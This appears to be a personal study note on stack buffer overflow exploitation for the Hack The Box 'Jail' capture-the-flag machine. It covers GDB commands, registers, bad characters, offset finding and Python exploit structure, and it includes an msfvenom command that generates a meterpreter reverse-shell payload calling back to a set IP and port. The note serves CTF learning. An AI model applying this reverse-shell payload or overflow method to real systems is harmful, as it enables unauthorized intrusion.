
# Buffer Overflow Notes
+ jail example included in "Example Code"
  + helpful link for performing it: https://reboare.github.io/htb/htb-jail.html
  + another more helpful link: https://www.hackingarticles.in/hack-the-box-challenge-jail-walkthrough/

## GDB Commands
+ enter GDB
+ $> gdb [binary file]
+
+ The below commands make gdb follow the forked processes in the program
+ $> set follow-fork-mode child
+ $> set detach-on-fork off
+
+ to view the registers
+ $> i r
+

## Registers
+ EBP: points to the base of the stack, this is your reference
+ EIP: points to the address of the next instruction to read
  + to get the EIP, send a string of unique characters [look at gdb command for this]
  + once you see a certain group of characters inside the EIP you can search for the characters in the original string [once again, look at gdb command for this]
+ ESP: points to where you are now on the stack
  + you can use a debugger

## Common Problems
+ some strings will make the exploit fail.  To solve this, you send a string with all characters.  You slowly remove characters until you have a good string.  
+ shell code cannot contain bad characters
+ remember there is big and little endien, this can make things difficult

## Generating an attack in python
+ first you need to create a seg fault by generating a pattern with the python code, then seeing the registers overwritten
  + this can also help determine endianness.  Little endian is where the values you see overwritten are reverse.  So if you overwrite the register with input string "abcd", then the hex value found after the program crashes will equal "dcba"
+ you'll take the value found in the register you want to overwrite (probably EIP), and search for it in the string pattern created earlier.  The one that caused the program to crash.  From this, you'll get an offset number
+ NOTE: an example of this is in the Jail example, it has nice comments, and should be used as an example
+ Libraries:
  + from pwn import *
  + import struct
+ Important pieces:
  + the offset: this is the number you got from the pattern
    + offset = 'A' * [your number]
  + the shellcode: you'll need to generate this
    + you'll have to find some code that works for the system you're exploiting.
    + $> msfvenom -l payloads | grep linux 
    + then you'll have to generate the payload specific to you're ip and port
    + $> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.22 LPORT=4444 -f py
  + the value you want to write into the register
    + this is a little tricky, you want this value to point to where the shell code will be written to
    + in the case of jail, we are given the address we want to write into the register because the program prints out the userpass address when run in debug mode






